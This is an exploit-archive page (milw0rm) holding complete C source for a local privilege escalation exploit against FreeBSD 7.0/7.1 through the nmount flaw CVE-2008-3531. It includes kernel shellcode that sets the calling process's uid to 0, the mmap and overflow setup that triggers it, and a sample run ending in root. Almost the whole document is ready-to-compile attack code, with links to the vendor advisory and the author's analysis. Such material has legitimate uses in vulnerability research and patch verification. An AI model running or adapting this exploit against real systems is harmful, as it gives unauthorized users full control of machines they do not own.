<html><head><title>FreeBSD 7.0/7.1 vfs.usermount Local Privilege Escalation Exploit</title></head><pre>/* 
 * cve-2008-3531.c -- Patroklos Argyroudis, argp at domain census-labs.com
 *
 * Privilege escalation exploit for the FreeBSD-SA-08:08.nmount
 * (CVE-2008-3531) vulnerability:
 * 
 * http://security.freebsd.org/advisories/FreeBSD-SA-08:08.nmount.asc
 * http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2008-3531
 *
 * For a detailed analysis see:
 *
 * http://census-labs.com/news/2009/07/02/cve-2008-3531-exploit/
 * 
 * Sample run:
 * 
 * [argp@leon ~]$ uname -rsi
 * FreeBSD 7.0-RELEASE GENERIC
 * [argp@leon ~]$ sysctl vfs.usermount
 * vfs.usermount: 1
 * [argp@leon ~]$ id
 * uid=1001(argp) gid=1001(argp) groups=1001(argp)
 * [argp@leon ~]$ gcc -Wall cve-2008-3531.c -o cve-2008-3531
 * [argp@leon ~]$ ./cve-2008-3531
 * [*] vptr = 0x006e776f
 * [*] calling nmount()
 * nmount: Unknown error: -1036235776
 * [argp@leon ~]$ id
 * uid=0(root) gid=0(wheel) egid=1001(argp) groups=1001(argp)
 *
 * $Id: cve-2008-3531.c,v 846ca34be34a 2009/02/29 11:05:02 argp $
 */

#include &lt;sys/param.h&gt;
#include &lt;sys/mount.h&gt;
#include &lt;sys/uio.h&gt;
#include &lt;err.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sysexits.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/mman.h&gt;

#define BUFSIZE     249

#define PAGESIZE    4096
#define ADDR        0x6e7000
#define OFFSET      1903

#define FSNAME      &quot;msdosfs&quot;
#define DIRPATH     &quot;/tmp/msdosfs&quot;

unsigned char kernelcode[] =
&quot;\x64\xa1\x00\x00\x00\x00&quot;   /* movl  %fs:0, %eax      # get curthread */
&quot;\x8b\x40\x04&quot;               /* movl  0x4(%eax), %eax  # get proc from curthread */
&quot;\x8b\x40\x30&quot;               /* movl  0x30(%eax),%eax  # get ucred from proc */
&quot;\x31\xc9&quot;                   /* xorl  %ecx, %ecx       # ecx = 0 */
&quot;\x89\x48\x04&quot;               /* movl  %ecx, 0x4(%eax)  # ucred.uid = 0 */
&quot;\x89\x48\x08&quot;               /* movl  %ecx, 0x8(%eax)  # ucred.ruid = 0 */
                             /* # return to the pre-previous function, i.e. vfs_donmount() */
&quot;\x81\xc4\xe8\x00\x00\x00&quot;   /* addl  $0xe8, %esp */
&quot;\x5b&quot;                       /* popl  %ebx */
&quot;\x5e&quot;                       /* popl  %esi */
&quot;\x5f&quot;                       /* popl  %edi */
&quot;\x5d&quot;                       /* popl  %ebp */
&quot;\xc3&quot;;                      /* ret */

int
main()
{
    void *vptr;
    struct iovec iov[6];

    vptr = mmap((void *)ADDR, PAGESIZE, PROT_READ | PROT_WRITE,
            MAP_FIXED | MAP_ANON | MAP_PRIVATE, -1, 0);

    if(vptr == MAP_FAILED)
    {
        perror(&quot;mmap&quot;);
        exit(EXIT_FAILURE);
    }

    vptr += OFFSET;
    printf(&quot;[*] vptr = 0x%.8x\n&quot;, (unsigned int)vptr);

    memcpy(vptr, kernelcode, (sizeof(kernelcode) - 1));

    mkdir(DIRPATH, 0700);

    iov[0].iov_base = &quot;fstype&quot;;
    iov[0].iov_len = strlen(iov[0].iov_base) + 1;
    
    iov[1].iov_base = FSNAME;
    iov[1].iov_len = strlen(iov[1].iov_base) + 1;
    
    iov[2].iov_base = &quot;fspath&quot;;
    iov[2].iov_len = strlen(iov[2].iov_base) + 1;
    
    iov[3].iov_base = DIRPATH;
    iov[3].iov_len = strlen(iov[3].iov_base) + 1;

    iov[4].iov_base = calloc(BUFSIZE, sizeof(char));

    if(iov[4].iov_base == NULL)
    {
        perror(&quot;calloc&quot;);
        rmdir(DIRPATH);
        exit(EXIT_FAILURE);
    }

    memset(iov[4].iov_base, 0x41, (BUFSIZE - 1));
    iov[4].iov_len = BUFSIZE;

    iov[5].iov_base = &quot;BBBB&quot;;
    iov[5].iov_len = strlen(iov[5].iov_base) + 1;

    printf(&quot;[*] calling nmount()\n&quot;);

    if(nmount(iov, 6, 0) &lt; 0)
    {
        perror(&quot;nmount&quot;);
        rmdir(DIRPATH);
        exit(EXIT_FAILURE);
    }

    printf(&quot;[*] unmounting and deleting %s\n&quot;, DIRPATH);
    unmount(DIRPATH, 0);
    rmdir(DIRPATH);

    return EXIT_SUCCESS;
}

// milw0rm.com [2009-07-09]</pre></html>